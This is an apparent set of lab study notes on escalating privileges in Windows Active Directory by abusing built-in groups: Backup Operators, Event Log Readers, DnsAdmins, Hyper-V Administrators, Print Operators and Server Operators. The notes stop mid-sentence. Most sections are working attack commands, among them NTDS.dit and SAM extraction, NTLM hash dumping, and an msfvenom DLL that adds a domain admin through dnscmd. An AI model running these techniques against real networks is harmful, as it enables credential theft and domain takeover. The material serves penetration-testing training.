Sometimes, we can utilize account with specific Built-In Groups to archive privilege escalation or as opener to path towards other account. Below is some groups we should lookout for:

|                                                                                                                                                                           |                                                                                                                                                                 |                                                                                                                                                                |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators)            | [Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders) | [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins)              |
| [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators) | [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)    | [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) |

Privilege Escalation with BackUp Operators:
One Example would be the Backup Operators Account, we first run whoami /priv to confirm we have respective privilege, we afterward need to load https://github.com/giuliano108/SeBackupPrivilege this tools over to target.

We import them both in PS, then enable privilege by following:
```
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege
```

Now we can copy any protected file which can expose sensitive information.

However, there is more of it, this group would give user permission to login locally to a DC, and since we can copy any file, we can now target the NTDS.dit file in the DC, we can use diskshadow to make a shadow copy of C drive and expose it as other drive, take the following example:
```
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

Next, we can use the Copy-FileSeBackupPrivilege from previous mentioned cmdlet to copy NTDS.dit:
```
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes
```

Or, we can use built in robocopy utility:
```
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

Next, we use reg save to dump SAM, SYSTEM and SECURITY (if we need local ac as well):
```
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```

Next, we transfer those file back to us, or if such is not possible, we use deploy DSInternals.psd1 over to our victim and expose NTLM Hash:
```
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
Sid: S-1-5-21-669053619-2741956077-1013132368-500
Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
SamAccountName: Administrator
<...snip...>
```

Searching Logs with Event Log Reader:

With Event Log Reader Permission, we can read logs from local machine using wevutil or Get-WinEvent cmdlet, sometimes we might be able to find plaintext credentials or other usable material in the logs:

```
PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

If we have other user's credential, we can also run wevutil with other user's credential:
```
C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

We can also use Get-WinEvent, but such requires admin access or specific permission adjusting on regkey `HKLM\System\CurrentControlSet\Services\Eventlog\Security` beforehead:

```
PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

Privilege Escalation with DnsAdmin:

If we found ourselves in possession of credential of account belongs to the DnsAdmin Group, we can use it to perform privilege escalation on local victim, or if we are allowed access on DC, we can use it as easy win to compromise domain by adding a new domain admin to the whole domain.

We first generate a malicious DLL with msfvenom:
```
Avalon112@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

The above payload would make user netadm the domain admin, depending on our situation we can issue other command, like a reverse shell or add a new domain / local admin.

We load the payload to target via different means.

Then, we load the dll with dnscmd.exe:
```
dnscmd.exe /config /serverlevelplugindll <fullpathtodll>
#Example
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

Next, we need to restart the dns service:
```
sc stop dns
sc start dns
```

Sometimes, the user may not have permission to perform restart, then we would have to wait for it to somehow be restarted.

For cleaning up or utilizing DnsAdmin to add a WPAD Record, refer to https://academy.hackthebox.com/app/module/67/section/603

Privilege Escalation via Hyper-V Administrators:

If the Domain Controllers are hypervised, then Hyper-V admin == Domain Admin, we could create a clone of the live DC and mount the vdisk offline to obtain the NTDS.dit file

If the patch date is prior to Match 2020, it might worth to try the method at https://academy.hackthebox.com/app/module/67/section/604

Privilege Escalation via Print Operators:

Escalating Privilege via Print Operators require one to compile a malicious payload utilizing the capcom dll, refer to  https://academy.hackthebox.com/app/module/67/section/605 if really need to carry out

Privilege Escalation via Server Operators:

Server Operator Groups allow users to administer different window server without the need of domain / enterprise admin. by default such users are permitted to login locally to different servers including DCs.

This group contains the powerful SeBackupPrivilege and SeRestorePrivilege along with other ability to control local services

Aside from following the path of SeBackupPrivilege, We can instead change services and have it execute payload that give us higher permission

We first use PsService of Sysinternal Suite to confirm readiness and whether we have full control over a service, we can first run Get-Service to confirm what service we have then use PsService, below is an example:
```
C:\htb> c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All
```

It is confirmed that Server Operators have A